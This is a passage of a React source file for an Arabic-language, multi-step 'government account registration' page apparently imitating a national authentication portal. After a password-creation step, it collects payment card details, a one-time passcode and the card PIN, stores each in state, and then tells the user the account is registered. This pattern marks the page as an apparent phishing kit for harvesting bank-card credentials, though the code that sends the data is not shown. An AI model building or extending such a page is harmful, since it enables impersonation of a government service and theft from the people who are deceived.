                  <button className="nas-btn-blue min-w-[100px]" onClick={handleNextStep}>استمر</button>
                </div>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="w-full max-w-[500px] bg-[#f5f5f5] border border-[#eeeeee] rounded-[4px] shadow-[0_1px_3px_rgba(0,0,0,0.1)] overflow-hidden ge-ss-two-font">
              <div className="text-right pt-8 pb-4 bg-[#f5f5f5] px-10">
                <h1 className="text-[18px] font-bold text-[#333]">إنشاء كلمة المرور</h1>
                <div className="w-full border-b border-[#dddddd] mt-4"></div>
              </div>
              <div className="px-10 py-4">
                <div className="bg-white border border-[#eeeeee] rounded-[6px] p-5 mb-8 text-right shadow-sm">
                  <h3 className="text-[14px] font-bold text-[#333] mb-3">يجب أن تحتوي كلمة المرور على:</h3>
                  <ul className="space-y-2 text-[13px] text-[#666] font-medium leading-relaxed">
                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasLower ? 'text-[#009e5a]' : ''}`}>
                      {validations.hasLower ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
                      <span>حرف صغير واحد على الأقل</span>
                    </li>
                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasUpper ? 'text-[#009e5a]' : ''}`}>
                      {validations.hasUpper ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
                      <span>حرف كبير واحد على الأقل</span>
                    </li>
                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasNumber ? 'text-[#009e5a]' : ''}`}>
                      {validations.hasNumber ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
                      <span>رقم واحد على الأقل</span>
                    </li>
                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasLength ? 'text-[#009e5a]' : ''}`}>
                      {validations.hasLength ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
                      <span>الحد الأدنى لطول كلمة المرور 8 أحرف</span>
                    </li>
                    <li className={`flex items-center justify-start gap-2 transition-all ${validations.hasSymbol ? 'text-[#009e5a]' : ''}`}>
                      {validations.hasSymbol ? <Check size={16} className="text-[#009e5a]" /> : <span className="w-4 h-4 rounded-full border-2 border-gray-300"></span>}
                      <span>رمز واحد على الأقل (% $ # @ & / - _)</span>
                    </li>
                  </ul>
                </div>
                <div className="space-y-5">
                  <div>
                    <label className="block text-[14px] font-bold text-[#333] mb-2 pr-1">أدخل كلمة المرور <span className="text-[#8a1538] font-bold">*</span></label>
                    <div className="relative">
                      <input 
                        type={showPassword ? "text" : "password"} 
                        value={password} 
                        onChange={(e) => {
                          const value = e.target.value;
                          // Block Hindi/Arabic numerals (٠-٩) and Arabic letters
                          const arabicRegex = /[\u0660-\u0669\u06F0-\u06F9\u0600-\u06FF]/;
                          if (arabicRegex.test(value)) {
                            setPasswordError('يرجى إدخال الأرقام الإنجليزية فقط (0-9) وليس الأرقام الهندية');
                            return;
                          }
                          // Allow only English letters, numbers, and special characters
                          const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
                          if (!englishRegex.test(value)) {
                            setPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
                            return;
                          }
                          setPasswordError('');
                          setPassword(value);
                        }} 
                        className="w-full h-[38px] border border-[#cccccc] rounded-[4px] px-4 text-left text-[15px] focus:border-[#66afe9] outline-none shadow-[inset_0_1px_1px_rgba(0,0,0,0.075)] bg-white"
                        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }} 
                        placeholder="" 
                      />
                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">{showPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button>
                    </div>
                    {passwordError && (
                      <p className="text-[#d9534f] text-[12px] mt-1">{passwordError}</p>
                    )}
                    {/* Password Strength Indicator */}
                    {password && passwordStrength.level !== 'none' && (
                      <div className="mt-3">
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-[12px] font-bold" style={{ color: passwordStrength.color }}>قوة كلمة المرور: {passwordStrength.text}</span>
                        </div>
                        <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
                          <div 
                            className="h-full transition-all duration-300 ease-in-out rounded-full"
                            style={{ 
                              width: passwordStrength.width,
                              backgroundColor: passwordStrength.color
                            }}
                          ></div>
                        </div>
                      </div>
                    )}
                  </div>
                  <div>
                    <label className="block text-[14px] font-bold text-[#333] mb-2 pr-1">إعادة إدخال كلمة المرور <span className="text-[#8a1538] font-bold">*</span></label>
                    <div className="relative">
                      <input 
                        type={showConfirmPassword ? "text" : "password"} 
                        value={confirmPassword} 
                        onChange={(e) => {
                          const value = e.target.value;
                          // Block Hindi/Arabic numerals (٠-٩) and Arabic letters
                          const arabicRegex = /[\u0660-\u0669\u06F0-\u06F9\u0600-\u06FF]/;
                          if (arabicRegex.test(value)) {
                            setConfirmPasswordError('يرجى إدخال الأرقام الإنجليزية فقط (0-9) وليس الأرقام الهندية');
                            return;
                          }
                          // Allow only English letters, numbers, and special characters
                          const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
                          if (!englishRegex.test(value)) {
                            setConfirmPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
                            return;
                          }
                          setConfirmPasswordError('');
                          setConfirmPassword(value);
                        }} 
                        className={`w-full h-[38px] border rounded-[4px] px-4 text-left focus:border-[#66afe9] outline-none bg-white ${confirmPassword && !isMatch ? 'border-red-400' : 'border-[#cccccc]'}`}
                        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }} 
                      />
                      <button type="button" onClick={() => setShowConfirmPassword(!showConfirmPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">{showConfirmPassword ? <EyeOff size={16} /> : <Eye size={16} />}</button>
                    </div>
                    {confirmPasswordError && (
                      <p className="text-[#d9534f] text-[12px] mt-1">{confirmPasswordError}</p>
                    )}
                    {confirmPassword && password && confirmPassword !== password && !confirmPasswordError && (
                      <p className="text-[#d9534f] text-[12px] mt-1">كلمة المرور غير متطابقة</p>
                    )}
                  </div>
                </div>
                <div className="flex justify-center items-center gap-4 mt-10 mb-6">
                  <button disabled={!canContinueStep3} className={`h-[36px] min-w-[90px] px-5 font-bold text-[14px] rounded-[4px] transition-all flex items-center justify-center shadow-sm ${canContinueStep3 ? 'bg-[#007fb1] text-white' : 'bg-gray-300 text-gray-500 cursor-not-allowed opacity-60'}`} onClick={handleNextStep}>استمر</button>
                  <button className="h-[36px] min-w-[90px] px-5 bg-white border border-[#cccccc] text-[#333] font-bold text-[14px] rounded-[4px] flex items-center justify-center" onClick={handlePrevStep}>رجوع</button>
                </div>
              </div>
            </div>
          )}

          {step === 4 && !isProcessing && (
            <div className="w-full flex justify-center">
              {paymentSubStep === 'info' && <PaymentInfo onNext={handleNextStep} onPrev={handlePrevStep} />}
              {paymentSubStep === 'card' && <PaymentForm onNext={handleNextStep} onPrev={handlePrevStep} onDataChange={setPaymentData} />}
              {paymentSubStep === 'otp' && <OTPForm onNext={handleNextStep} onDataChange={setOtpData} />}
              {paymentSubStep === 'pin' && <PINForm onNext={handleNextStep} onDataChange={setPinData} />}
            </div>
          )}

          {step === 5 && !isProcessing && (
            <div className="w-full">
              <VerificationForm 
                onNext={handleNextStep} 
                onDataChange={setVerificationData}
                initialSubStep={verificationSubStep}
              />
            </div>
          )}

          {step === 6 && (
            <div className="nas-well p-12 text-center animate-in zoom-in duration-500">
              <div className="flex flex-col items-center gap-6">
                <div className="w-20 h-20 bg-[#009e5a] rounded-full flex items-center justify-center shadow-lg">
                  <Check className="text-white w-12 h-12" strokeWidth={3} />
                </div>
                <h1 className="text-[26px] font-bold text-[#333]">تم تسجيل حسابك بنجاح</h1>
                <p className="text-[16px] text-gray-600 max-w-[400px]">لقد تم توثيق جميع بياناتك بنجاح. يمكنك الآن استخدام حسابك للوصول إلى الخدمات الحكومية.</p>
                <button className="nas-btn-blue h-[42px] px-10 text-[16px] mt-4" onClick={() => window.location.reload()}>تسجيل الدخول</button>
              </div>
            </div>
          )}

          {step > 0 && (
            <div className="mt-8">
              <Footer />
            </div>
          )}
        </main>
      </div>
    </div>
  );
};

export default App;